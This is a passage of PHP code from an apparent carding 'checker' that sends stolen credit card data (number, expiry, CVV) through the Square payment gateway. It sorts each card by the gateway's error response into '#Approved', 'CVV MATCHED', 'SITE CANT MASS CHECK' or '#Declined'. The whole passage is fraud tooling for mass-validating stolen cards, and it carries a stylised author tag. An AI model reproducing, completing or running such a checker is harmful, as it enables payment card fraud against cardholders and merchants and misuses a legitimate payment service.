...
if (strpos($resultc, "Authorization error: 'ADDRESS_VERIFICATION_FAILURE'")) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info"> [SQUAREUP] [kคli liຖนxx] </span> </span>  <span class="text-succes">#Approved</span></span> <span class="text-success"> R:  CVV MATCHED </span></br>';
} 

elseif (strpos($resultc, "Authorization error: 'CVV_FAILURE'")) {

  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info"> [SQUAREUP] [kคli liຖนxx] </span> </span>  <span class="text-succes">#Approved</span></span> <span class="text-success"> R:  CNN MATCHED </span></br>';

} 

elseif (strpos($resultc, "Authorization error: 'GENERIC_DECLINE'")) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[SQUAREUP] [kคli liຖนxx]  </span> <span class="text-danger">[SITE CANT MASS CHECK]</span></span> </span> <span class="text-danger"> R: DEAD- SITE CANT MASS CHECK </span></br>';
}
elseif (strpos($resultc, "Authorization error: 'TRANSACTION_LIMIT'")) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[SQUAREUP] [kคli liຖนxx]  </span> <span class="text-danger">[TRANSACTION NOT ALLOWED]#Aprovada</span></span> </span> <span class="text-danger"> R: CVV MATCHED '.$reason.' </span></br>';
}
else {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[SQUAREUP] [kคli liຖนxx]  </span> <span class="text-danger">[#Declined]</span></span> </span> <span class="text-danger"> R:  DECLINED </span></br>';
}
